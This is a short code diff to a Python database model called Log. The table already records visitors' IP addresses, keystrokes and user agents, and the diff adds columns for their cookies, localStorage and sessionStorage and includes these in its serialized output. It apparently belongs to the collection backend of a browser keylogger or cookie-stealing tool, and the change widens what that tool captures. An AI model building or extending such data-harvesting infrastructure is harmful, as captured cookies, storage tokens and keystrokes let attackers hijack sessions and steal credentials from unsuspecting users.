@@ -5,10 +5,13 @@ from sqlalchemy import event
 class Log(db.Model):
     __tablename__ = "log"
     
+    cookies = db.Column(db.Text, unique=False, nullable=True)
     created_at = db.Column(db.DateTime, server_default=db.func.now())
     id = db.Column(db.Integer, primary_key=True)
     ip = db.Column(db.String(50), unique=False, nullable=False)
     keystrokes = db.Column(db.Text, unique=False, nullable=False)
+    local_storage = db.Column(db.Text, unique=False, nullable=True)
+    session_storage = db.Column(db.Text, unique=False, nullable=True)
     user_agent = db.Column(db.Text, unique=False, nullable=False)
 
     def __repr__(self):
@@ -17,10 +20,13 @@ class Log(db.Model):
     @property
     def serialize(self):
         return {
+            "cookies": self.cookies,
             "created_at": self.created_at,
             "id": self.id,
             "ip": self.ip,
             "keystrokes": self.keystrokes,
+            "local_storage": self.local_storage,
+            "session_storage": self.session_storage,
             "user_agent": self.user_agent
         }
 
